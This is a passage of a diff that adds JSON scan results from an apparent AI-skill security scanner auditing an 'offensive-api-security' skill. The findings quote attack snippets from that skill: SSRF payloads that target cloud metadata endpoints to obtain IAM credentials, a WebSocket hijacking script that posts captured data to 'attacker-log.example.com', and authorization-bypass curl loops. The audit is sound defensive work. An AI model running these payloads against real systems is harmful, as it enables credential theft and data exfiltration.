+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 202,
+            "column": 17,
+            "evidence": "\"events\": [\"user.created\", \"order.completed\", \"payment.received\"],",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 202,
+            "column": 33,
+            "evidence": "\"events\": [\"user.created\", \"order.completed\", \"payment.received\"],",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 202,
+            "column": 52,
+            "evidence": "\"events\": [\"user.created\", \"order.completed\", \"payment.received\"],",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 322,
+            "column": 12,
+            "evidence": "with open('attacker_pub.pem', 'rb') as f:",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 434,
+            "column": 22,
+            "evidence": "-d '<?xml version=\"1.0\"?>",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 14,
+        "findings_after_filtering": 14,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    },
+    {
+      "name": "offensive-api-security",
+      "path": "offensive-api-security",
+      "risk_score": 49,
+      "risk_severity": "MEDIUM",
+      "finding_count": 10,
+      "execution_successful": true,
+      "transitive_finding_count": 0,
+      "transitive_sources": [],
+      "skill": {
+        "name": "offensive-api-security",
+        "source": "/Users/test/Desktop/neuron-surgery/skill-audit/repos/SnailSploit_Claude-Red/Skills/api/offensive-api-security",
+        "scanned_at": "2026-11-13T11:38:02.885020+00:00"
+      },
+      "risk_assessment": {
+        "score": 49,
+        "severity": "MEDIUM",
+        "recommendation": "CAUTION",
+        "max_issue_severity": "HIGH"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 504,
+          "executable": false,
+          "size_bytes": 19822,
+          "source_url": null,
+          "source_identity": null,
+          "source_digest": null
+        }
+      ],
+      "structured_summaries": [],
+      "issues": [
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-f96db1f233e74816b82313ded2f6daa8",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 252,
+            "end_line": null,
+            "start_column": 10
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "\n```bash\nssrf_payloads=(\n  \"http://169.254.169.254/latest/meta-data/\"\n  \"http://metadata.google.internal/computeMetadata/v1/\"\n  \"http://127.0.0.1:8080/admin\"\n  \"http://::1:8080/\"",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 252,
+              "end_line": null,
+              "start_column": 10
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-dfe0ac3778424696b037d54e22570b0b",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 275,
+            "end_line": null,
+            "start_column": 29
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "```bash\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"import_url\": \"http://169.254.169.254/latest/user-data\"}' \\\n  \"https://target.example.com/api/v1/data/import\"\n\ncurl -s -X PUT -H \"Authorization: Bearer $TOKEN\" \\",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 275,
+              "end_line": null,
+              "start_column": 29
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-98c2130d545d4592b7ba5ed5b873f113",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 280,
+            "end_line": null,
+            "start_column": 29
+          },
+          "finding": "169.254.169.254",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "\ncurl -s -X PUT -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"avatar_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}' \\\n  \"https://target.example.com/api/v1/users/me/profile\"\n```\n",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "d61ab72824eae3143803cfed4f723d8454fedefdac1d6ad5c7f4299f9032a6ee",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 280,
+              "end_line": null,
+              "start_column": 29
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "SSRF1",
+          "finding_id": "finding-0927370e9fe24795b17b78dcdfeb2f70",
+          "category": "Server-Side Request Forgery",
+          "pattern": "Cloud Metadata Access",
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 253,
+            "end_line": null,
+            "start_column": 10
+          },
+          "finding": "metadata.google.internal",
+          "explanation": "Code accesses a cloud instance metadata endpoint (e.g. 169.254.169.254). A single request can return temporary IAM credentials, making this a high-value SSRF target for credential theft.",
+          "remediation": "Remove access to cloud metadata endpoints unless strictly required. If metadata is needed, restrict it (e.g. IMDSv2 with hop limit) and never expose returned credentials.",
+          "code_snippet": "```bash\nssrf_payloads=(\n  \"http://169.254.169.254/latest/meta-data/\"\n  \"http://metadata.google.internal/computeMetadata/v1/\"\n  \"http://127.0.0.1:8080/admin\"\n  \"http://::1:8080/\"\n  \"http://0x7f000001/\"",
+          "intent": null,
+          "tags": [
+            "Server-Side Request Forgery"
+          ],
+          "evidence": {},
+          "match_fingerprint": "628815e490cc42c38af4f44f4927d10f2a63a73dfe75c8399825a110c480b04c",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 253,
+              "end_line": null,
+              "start_column": 10
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-b36f4c970daf44ef82015294375c53e7",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 68,
+            "end_line": null,
+            "start_column": 2
+          },
+          "finding": "curl -s -o /dev/null -w \"${method} -> %{http_code}\\n\" \\\n    -X \"${method}\" \\\n    -H \"Authorization: Bearer $TOKEN_A\" \\\n    -H \"Content-Type: application/json\" \\\n    -d '{\"status\":\"cancelled\"}' \\\n    \"",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n```bash\nfor method in GET PUT PATCH DELETE; do\n  curl -s -o /dev/null -w \"${method} -> %{http_code}\\n\" \\\n    -X \"${method}\" \\\n    -H \"Authorization: Bearer $TOKEN_A\" \\\n    -H \"Content-Type: application/json\" \\",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "651c400aa69d666723e963b3fb5c8b0230c8bf4bc9689047d917a77860338cbd",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 68,
+              "end_line": null,
+              "start_column": 2
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-f64c0a99ac6d494ea099cb9c52a6bfbb",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 106,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -o /dev/null -w \"Expired: %{http_code}\\n\" \\\n  -H \"Authorization: Bearer $EXPIRED_TOKEN\" \\\n  \"https://target.example.com/api/v1/users/me\"\n\ncurl -s -o /dev/null -w \"Pre-change: %{http_code}\\n\" \\",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "\n```bash\n# Expired token, post-password-change token, malformed bearer values\ncurl -s -o /dev/null -w \"Expired: %{http_code}\\n\" \\\n  -H \"Authorization: Bearer $EXPIRED_TOKEN\" \\\n  \"https://target.example.com/api/v1/users/me\"\n",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "f64cf2ff570d3acfd434a274ac63bae2493c14e5e2734fea6a625407128e02ba",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 106,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-5a82809f03b64aefa39ec56d3ccf1cbc",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 147,
+            "end_line": null,
+            "start_column": 4
+          },
+          "finding": "curl -s -o /dev/null -w \"Large payload: %{http_code}\\n\" \\\n  -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" -d ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "import json, sys\npayload = {'name': 'A' * 1000000, 'tags': ['x'] * 10000}\nsys.stdout.write(json.dumps(payload))\n\" | curl -s -o /dev/null -w \"Large payload: %{http_code}\\n\" \\\n  -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" -d @- \\\n  \"https://target.example.com/api/v1/products\"",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "f06a967d13c02f657607b5a69efb6749d5888d9c778ac5692a1c94c70bac1201",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 147,
+              "end_line": null,
+              "start_column": 4
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-927eacd8de8942b680c4c53fb56301f6",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 173,
+            "end_line": null,
+            "start_column": 9
+          },
+          "finding": "curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" -H \"Authorization: Bearer $REGULAR_USER_TOKEN\" \\\n    \"https://target.example.com${path}\")\n  echo \"${method} ${path} -> HTTP ${code}\"\ndone\n```\n",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "for ep in \"${admin_endpoints[@]}\"; do\n  method=$(echo \"$ep\" | cut -d' ' -f1)\n  path=$(echo \"$ep\" | cut -d' ' -f2)\n  code=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" -H \"Authorization: Bearer $REGULAR_USER_TOKEN\" \\\n    \"https://target.example.com${path}\")\n  echo \"${method} ${path} -> HTTP ${code}\"",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "041ee16a7b55b0adccb1694e1286c8e18933996f58c2529959bc02cbc6ced824",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 173,
+              "end_line": null,
+              "start_column": 9
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-ae144e3cd9f94454a2e6d7d63157613d",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 205,
+            "end_line": null,
+            "start_column": 9
+          },
+          "finding": "curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" -H \"Authorization: Bearer $TOKEN\" \\\n    \"https://target.example.com/api/v1/admin/settings\")\n  echo \"${method} -> HTTP ${code}\"\ndone\n```\n\n```ba",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "```bash\n# Verb tampering: test all methods against a restricted endpoint\nfor method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do\n  code=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X \"$method\" -H \"Authorization: Bearer $TOKEN\" \\\n    \"https://target.example.com/api/v1/admin/settings\")\n  echo \"${method} -> HTTP ${code}\"",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "25de7ba8583299a1a0bbd67c649223f44b5b00967f058abacc5d5af67c28832e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 205,
+              "end_line": null,
+              "start_column": 9
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-458e59e985874135930122a21845284a",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 273,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"import_url\": \"http://169.254.169.254/latest/user-data\"}' \\\n  \"https://target.example.com/api/v1/data",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "Test SSRF through import/export and profile features:\n\n```bash\ncurl -s -X POST -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"import_url\": \"http://169.254.169.254/latest/user-data\"}' \\\n  \"https://target.example.com/api/v1/data/import\"",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "1e2d806af78ea339ed7b31fa3bae411c3aa8b7b55e61be79e247d8df8b6b0a1e",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 273,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-93741d5993ff40778b96ca0a8ec930a4",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 396,
+            "end_line": null,
+            "start_column": 4
+          },
+          "finding": "fetch(\"https://attacker-log.example.com/log\", {method: \"POST\"",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "  };\n  ws.onmessage = function(evt) {\n    console.log(\"[CSWSH] Received: \" + evt.data);\n    fetch(\"https://attacker-log.example.com/log\", {method: \"POST\", body: evt.data});\n  };\n  ws.onerror = function(e) {\n    console.log(\"[CSWSH] Connection failed -- origin may be validated\");",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "a981ab756e8ccd7a2b3a37674ab9b00f14592fb443c5cc867c875f3b26436839",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 396,
+              "end_line": null,
+              "start_column": 4
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-c9023e4e20ef4bf3a84eea9fd9edd58a",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 442,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -D ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "  \"https://target.example.com/api/v1/users/me\" 2>&1 | \\\n  grep -iE \"access-control|allow-origin|allow-credentials\"\n\ncurl -s -D - -o /dev/null -H \"Origin: null\" \\\n  \"https://target.example.com/api/v1/users/me\" 2>&1 | grep -i \"access-control\"\n\n# Security header audit",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "31222c521ba6c65e62af195bd0c1d51545f0650e4a2bf65c0152f1d4708bc212",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 442,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-686be0efa1ee4bb288ff1c50dd32bb89",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.6,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 446,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "curl -s -D ",
+          "explanation": "Data is being sent to an external URL. This could be legitimate telemetry or data exfiltration. Manual review is recommended.",
+          "remediation": "Verify the destination URL is trusted and necessary. Remove or replace with documented APIs. Ensure no secrets, tokens, or PII are transmitted.",
+          "code_snippet": "  \"https://target.example.com/api/v1/users/me\" 2>&1 | grep -i \"access-control\"\n\n# Security header audit\ncurl -s -D - -o /dev/null \"https://target.example.com/api/v1/health\" 2>&1 | \\\n  grep -iE \"x-content-type|x-frame|strict-transport|content-security|x-powered-by|server:\"\n```\n",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "evidence": {},
+          "match_fingerprint": "31222c521ba6c65e62af195bd0c1d51545f0650e4a2bf65c0152f1d4708bc212",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 446,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        }
+      ],
+      "suppressed_count": 0,
+      "suppressed": [],
+      "metadata": {
+        "has_executable_scripts": false,
+        "skillspector_version": "2.12.0",
+        "llm_requested": false,
+        "llm_available": false,
+        "meta_analysis_applied": false,
+        "inference_usage": [],
+        "llm_provenance": {
+          "schema_version": 1,
+          "provider": {
+            "configured_adapter": "unknown",
+            "resolved_adapter": "unknown",
+            "effective_adapter": "not_applicable",
+            "effective_adapters": [],
+            "service": "unknown",
+            "routing": {
+              "deployment_override": null,
+              "deployment_source": "unknown",
+              "api_version": null,
+              "api_version_source": "unknown"
+            }
+          },
+          "analyzers": [
+            {
+              "analyzer_id": "mcp_tool_poisoning",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_developer_intent",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_quality_policy",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "semantic_security_discovery",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            },
+            {
+              "analyzer_id": "meta_analyzer",
+              "model": "z-ai/glm-5.3",
+              "model_source": "resolved_configuration",
+              "analyzer_revision": {
+                "value": "2.12.0",
+                "source": "skillspector_package",
+                "source_revision": {
+                  "value": "9dc82fe473329b2b742aa5097dcfe7ae55f51b01",
+                  "source": "package_vcs_metadata"
+                }
+              }
+            }
+          ],
+          "sampling": {
+            "temperature": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "seed": {
+              "requested": null,
+              "source": "unset",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            },
+            "reasoning_effort": {
+              "requested": null,
+              "source": "provider_default",
+              "forwarded_to_client": null,
+              "adapter_support": false,
+              "provider_support": "unknown"
+            }
+          },
+          "determinism": {
+            "classification": "not_applicable",
+            "control_status": "not_applied",
+            "provider_guarantee": false,
+            "reason": "LLM analysis was not executed for this scan."
+          }
+        },
+        "filtering_mode": "heuristic"
+      },
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "status": "complete_with_caveats",
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 30,
+            "end_line": 30,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 38,
+            "end_line": 38,
+            "fatal": false
+          },
+          {
+            "outcome": "partial",
+            "phase": "reference_resolution",
+            "reason_code": "reference_missing",
+            "message": "A local path-like reference does not match any bundled artifact, such as a file the skill writes at runtime.",
+            "path": "SKILL.md",
+            "start_line": 236,
+            "end_line": 236,
+            "fatal": false
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "artifact_integrity",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "bundled_execution_surface",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "disabled",
+            "planned_work": 0,
+            "completed": 0,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "disabled_by_configuration",
+            "message": "Analyzer was disabled by the requested configuration."
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
